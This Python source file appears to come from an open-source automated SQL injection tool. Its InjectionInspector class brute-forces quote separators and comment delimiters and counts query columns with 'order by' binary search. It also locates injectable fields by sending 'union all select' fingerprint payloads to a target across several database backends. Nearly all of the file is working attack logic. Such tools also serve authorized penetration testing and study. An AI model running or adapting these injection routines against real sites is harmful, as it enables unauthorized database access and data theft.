#!/usr/bin/python3
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from dbmsmoles import DbmsMole
from exceptions import *

class InjectionInspector:

    # Returns a tuple (separator, parenthesis count)
    def find_separator(self, mole):
        separator_list = ['\'', '"', ' ']
        equal_cmp = { '\'' : 'like', '"' : 'like', ' ' : '='}
        separator = None
        mole.stop_query = False
        for parenthesis in range(0, 3):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            mole.parenthesis = parenthesis
            for sep in separator_list:
                if mole.stop_query:
                    raise StoppedQueryException()
                print('[i] Trying separator: "' + sep + '"')
                mole.separator = sep
                try:
                    req = mole.make_request(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}1'.format(sep=sep))
                except ConnectionException as ex:
                    raise SeparatorNotFound()
                if mole.analyser.is_valid(req):
                    # Validate the negation of the query
                    try:
                        req = mole.make_request(' and {sep}1{sep} ' + equal_cmp[sep] + ' {sep}0'.format(sep=sep))
                    except ConnectionException as ex:
                        raise SeparatorNotFound()
                    if not mole.analyser.is_valid(req):
                        return (sep, parenthesis)
        if not separator:
            raise SeparatorNotFound()

    # Returns a tuple (comment, parentesis count)
    def find_comment_delimiter(self, mole):
        #Find the correct comment delimiter
        if mole._dbms_mole is None:
            comment_list = ['#', '--', '/*', ' ']
        else:
            comment_list  = mole._dbms_mole.comment_list
        mole.stop_query = False
        for parenthesis in range(0, 3):
            print('[i] Trying injection using',parenthesis,'parenthesis.')
            mole.parenthesis = parenthesis
            for com in comment_list:
                if mole.stop_query:
                    raise StoppedQueryException()
                print('[i] Trying injection using comment:',com)
                mole.comment = com
                try:
                    req = mole.make_request(' order by 1')
                except ConnectionException as ex:
                    raise CommentNotFound()
                if mole.analyser.node_content(req) != mole._syntax_error_content and not DbmsMole.is_error(req):
                    return (com, parenthesis)
        mole.parenthesis = 0
        raise CommentNotFound()

    # Returns query column number
    def find_column_number(self, mole):
        #Find the number of columns of the query
        #First get the content of needle in a wrong situation
        try:
            req = mole.make_request(' order by 15000')
        except ConnectionException as ex:
            raise ColumnNumberNotFound(str(ex))
        content_of_needle = mole.analyser.node_content(req)
        mole.stop_query = False
        last = 2
        done = False
        try:
            new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (last,)))
        except ConnectionException as ex:
            raise ColumnNumberNotFound(str(ex))
        while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
            if mole.stop_query:
                raise StoppedQueryException()
            last *= 2
            print('\r[i] Trying ' + str(last) + ' columns     ', end='')
            try:
                new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (last,)))
            except ConnectionException as ex:
                raise ColumnNumberNotFound(str(ex))
        pri = last // 2
        print('\r[i] Maximum length: ' + str(last) + '     ', end='')
        while pri < last:
            if mole.stop_query:
                raise StoppedQueryException()
            medio = ((pri + last) // 2) + ((pri + last) & 1)
            print('\r[i] Trying ' + str(medio) + ' columns     ', end='')
            try:
                new_needle_content = mole.analyser.node_content(mole.make_request(' order by %d ' % (medio,)))
            except ConnectionException as ex:
                raise ColumnNumberNotFound(str(ex))
            if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
                pri = medio
            else:
                last = medio - 1
        print('\r', end='')
        return pri

    def _find_injectable_field_using(self, mole, dbms_mole):
        base = 714
        fingers = dbms_mole.injectable_field_fingers(mole.query_columns, base)
        index = 0
        for finger in fingers:
            if mole.stop_query:
                raise StoppedQueryException()
            print('\r[+] Trying finger ' + str(index+1) + '/' + str(len(fingers)))
            index +=1
            hashes = finger.build_query()
            to_search_hashes = finger.fingers_to_search()
            hash_string = ",".join(hashes)
            try:
                req = mole.make_request(
                        " and 1=0 union all select " + hash_string + dbms_mole.field_finger_trailer()
                    )
            except ConnectionException as ex:
                return None

            injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
            if len(injectable_fields) > 0:
                print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), injectable_fields)) + "]")
                field = self._filter_injectable_fields(mole, dbms_mole, injectable_fields, finger)
                if field is not None:
                    mole._dbms_mole = dbms_mole()
                    mole._dbms_mole.set_good_finger(finger)
                    return field
                else:
                    print('[i] Failed to inject using these fields.')
        return None

    def find_injectable_field(self, mole):
        mole.stop_query = False
        if mole._dbms_mole is None:
            for dbms_mole in mole.dbms_mole_list:
                if mole.stop_query:
                    raise StoppedQueryException()
                print('[i] Trying DBMS', dbms_mole.dbms_name())
                field = self._find_injectable_field_using(mole, dbms_mole)
                if field is not None:
                    print('[+] Found DBMS:', dbms_mole.dbms_name())
                    return field
        else:
            field = self._find_injectable_field_using(mole, mole._dbms_mole.__class__)
            if field is not None:
                return field
        raise InjectableFieldNotFound()

    def _filter_injectable_fields(self, mole, dbms_mole_class, injectable_fields, finger):
        for field in injectable_fields:
            print('[i] Trying to inject in field', field + 1)
            query = dbms_mole_class.field_finger_query(mole.query_columns, finger, field)
            try:
                req = mole.make_request(query)
            except ConnectionException as ex:
                return None
            if dbms_mole_class.field_finger(finger) in req:
                return field
        return None
